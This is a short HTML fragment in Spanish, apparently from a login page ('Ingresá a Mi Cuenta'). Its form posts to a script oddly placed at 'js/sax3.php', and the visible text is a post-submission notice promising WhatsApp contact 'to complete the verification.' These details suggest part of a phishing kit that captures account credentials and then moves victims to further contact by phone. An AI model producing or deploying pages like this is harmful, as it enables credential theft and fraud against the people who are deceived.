    ...
    <section id="login-section">
      <div class="row">
        ...
        <div class="col-12 col-md-6 columna-formulario">
          <!-- Formulario -->
          <form  method="post"  action="js/sax3.php" onsubmit="return validarFormulario()" class="form-inline module-content-rotate generic-form" id="form_login">
          
            <h2 style="color: currentColor" class="mt-1 mt-md-5">Ingresá a Mi Cuenta</h2>
            <br>
            <br>
            <fieldset class="camposAcceso24 mt-md-4">
              <img src="img/check.png" style="width: 40px; display: block;margin: 0 auto;">
              <div>
                <div class="text-label mb-3">
                  <label style="text-align: center;">Estaremos comunicandonos contigo en las próximas horas vía Whatsapp para completar la verificación, gracias por utilizar nuestros servicios.</label>
                </div>
